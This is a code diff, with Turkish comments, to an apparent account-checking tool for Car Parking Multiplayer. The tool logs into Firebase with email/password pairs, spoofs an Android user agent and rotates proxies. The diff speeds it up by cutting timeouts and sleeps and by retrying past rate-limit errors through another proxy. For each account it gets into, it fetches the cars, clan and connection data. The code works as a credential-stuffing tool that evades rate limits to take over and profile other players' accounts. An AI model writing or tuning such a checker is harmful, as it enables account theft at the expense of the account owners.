@@ -29,10 +29,10 @@ async def async_http_post(
     url: str,
     payload: dict,
     headers: Optional[dict] = None,
-    timeout: float = 8.5,
+    timeout: float = 4.0,
     proxy: Optional[str] = None
 ) -> Tuple[Optional[dict], Optional[str]]:
-    """Genel asenkron HTTP POST isteği."""
+    """Ultra hızlı asenkron HTTP POST isteği."""
     default_headers = {
         "Content-Type": "application/json",
         "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"
@@ -50,7 +50,7 @@ async def async_http_post(
             json=payload,
             headers=default_headers,
             proxy=req_proxy,
-            timeout=aiohttp.ClientTimeout(total=timeout, connect=2.5, sock_read=4.0)
+            timeout=aiohttp.ClientTimeout(total=timeout, connect=2.0, sock_read=3.0)
         ) as resp:
             text = await resp.text()
             try:
@@ -59,9 +59,9 @@ async def async_http_post(
                 data = {"raw_text": text}
             return data, None
     except asyncio.TimeoutError:
-        return None, "İstek Zaman Aşımına Uğradı (Timeout)"
+        return None, "Zaman Aşımı (Timeout)"
     except aiohttp.ClientProxyConnectionError:
-        return None, "Proxy Bağlantı Hatası"
+        return None, "Proxy Hatası"
     except Exception as e:
         return None, str(e)
 
@@ -73,7 +73,7 @@ async def fetch_cpm_account_details(
     uid: str,
     proxy: Optional[str] = None
 ) -> Dict[str, Any]:
-    """Firebase doğrulanmış hesabın tüm CPM oyun içi detaylarını paralel çeker."""
+    """Firebase doğrulanmış hesabın oyun içi detaylarını paralel çeker."""
     details = {
         "email": email,
         "password": password,
@@ -99,11 +99,11 @@ async def fetch_cpm_account_details(
     }
 
     tasks = [
-        async_http_post(session, AUTH_LOOKUP_URL, {"idToken": id_token}, timeout=8.0, proxy=proxy),
-        async_http_post(session, f"{CF_BASE_URL}/GetUserConnectionData2", {"data": {}}, cf_headers, timeout=8.0, proxy=proxy),
-        async_http_post(session, f"{CF_BASE_URL}/WSGetCarIDnStatusV3", {"data": {}}, cf_headers, timeout=8.0, proxy=proxy),
-        async_http_post(session, f"{CF_BASE_URL}/GetAllCars2", {"data": {}}, cf_headers, timeout=8.0, proxy=proxy),
-        async_http_post(session, f"{CF_BASE_URL}/GetClanId", {"data": {}}, cf_headers, timeout=8.0, proxy=proxy),
+        async_http_post(session, AUTH_LOOKUP_URL, {"idToken": id_token}, timeout=3.5, proxy=proxy),
+        async_http_post(session, f"{CF_BASE_URL}/GetUserConnectionData2", {"data": {}}, cf_headers, timeout=3.5, proxy=proxy),
+        async_http_post(session, f"{CF_BASE_URL}/WSGetCarIDnStatusV3", {"data": {}}, cf_headers, timeout=3.5, proxy=proxy),
+        async_http_post(session, f"{CF_BASE_URL}/GetAllCars2", {"data": {}}, cf_headers, timeout=3.5, proxy=proxy),
+        async_http_post(session, f"{CF_BASE_URL}/GetClanId", {"data": {}}, cf_headers, timeout=3.5, proxy=proxy),
     ]
 
     results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -186,8 +186,9 @@ async def check_cpm_account(
     proxy: Optional[str] = None
 ) -> Tuple[bool, Optional[Dict[str, Any]], Optional[str]]:
     """
-    Akıllı 4 Kademeli Retry Motoru ile CPM hesabını test eder.
-    Kesin kimlik doğrulama hatalarında derhal çıkar, proxy aksaklıklarında otomatik yeniden dener.
+    Ultra hızlı ve takılmayan 2 Aşamalı CPM Hesap Kontrolü.
+    1. Aşama: Apify / Hızlı Proxy
+    2. Aşama: Doğrudan Temiz Bağlantı (Fallback)
     """
     login_payload = {
         "email": email.strip(),
@@ -195,35 +196,28 @@ async def check_cpm_account(
         "returnSecureToken": True
     }
 
-    max_attempts = 4
+    proxies_to_try = [
+        proxy if proxy else (APIFY_PROXY_URL if APIFY_PROXY_URL else proxy_mgr.get_random_proxy()),
+        None  # Doğrudan temiz bağlantı (en hızlı ve kesin)
+    ]
+
     last_err = "Bilinmeyen Hata"
 
-    for attempt in range(1, max_attempts + 1):
-        if attempt == 1:
-            current_proxy = proxy if proxy else proxy_mgr.get_random_proxy()
-        elif attempt == 2:
-            current_proxy = proxy_mgr.get_random_proxy()
-        elif attempt == 3:
-            current_proxy = APIFY_PROXY_URL if APIFY_PROXY_URL else proxy_mgr.get_random_proxy()
-        else:
-            current_proxy = None  # Son denemede doğrudan temiz bağlantı
-
+    for current_proxy in proxies_to_try:
         data, err = await async_http_post(
             session=session,
             url=AUTH_LOGIN_URL,
             payload=login_payload,
-            timeout=8.5,
+            timeout=3.5,
             proxy=current_proxy
         )
 
         if err:
             last_err = err
-            await asyncio.sleep(0.3)
             continue
 
         if not data:
             last_err = "Yanıt Alınamadı"
-            await asyncio.sleep(0.3)
             continue
 
         # Başarılı Giriş
@@ -233,7 +227,7 @@ async def check_cpm_account(
             details = await fetch_cpm_account_details(session, email, password, id_token, uid, proxy=current_proxy)
             return True, details, None
 
-        # Kesin Firebase Kimlik Hataları
+        # Kesin Firebase Kimlik Hataları (Anında Çıkış)
         if "error" in data and isinstance(data["error"], dict):
             msg = data["error"].get("message", "UNKNOWN_ERROR")
             if "INVALID_PASSWORD" in msg or "INVALID_LOGIN_CREDENTIALS" in msg:
@@ -243,12 +237,11 @@ async def check_cpm_account(
             elif "USER_DISABLED" in msg:
                 return False, None, "Hesap Devre Dışı"
             elif "TOO_MANY_ATTEMPTS_TRY_LATER" in msg:
-                last_err = "Geçici Hız Sınırı (Rate Limit)"
-                await asyncio.sleep(0.5)
+                last_err = "Geçici Hız Sınırı"
                 continue
             else:
                 return False, None, f"Firebase: {msg}"
 
-        last_err = "Bilinmeyen Giriş Hatası"
+        last_err = "Giriş Yapılamadı"
 
     return False, None, last_err
